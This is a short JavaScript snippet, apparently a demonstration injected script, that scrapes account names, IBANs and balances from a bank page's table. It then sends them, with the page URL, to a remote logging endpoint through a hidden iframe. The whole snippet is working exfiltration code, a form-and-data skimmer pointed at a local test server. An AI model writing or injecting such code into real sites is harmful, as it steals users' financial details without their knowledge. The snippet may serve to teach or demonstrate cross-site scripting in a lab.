// use an iframe element to make an GET HTTP request
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);

function send(data) {
	// add the current web pages URL to the outgoiing data
	data += '&url=' + encodeURIComponent(window.location.href);

	// set the iframes src attribute to our remote server
	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
}
	
if(window.location.href === "https://localhost:3001/bank") {
	var data = [];
	$('tbody > tr').each(function(i) {
		var td_elements = $(this).children('td');
		data.push('account' + i + '=' + td_elements.eq(0).text());
		data.push('iban'    + i + '=' + td_elements.eq(1).text());
		data.push('balance' + i + '=' + td_elements.eq(2).text());
	});
	send(data.join('&'));
}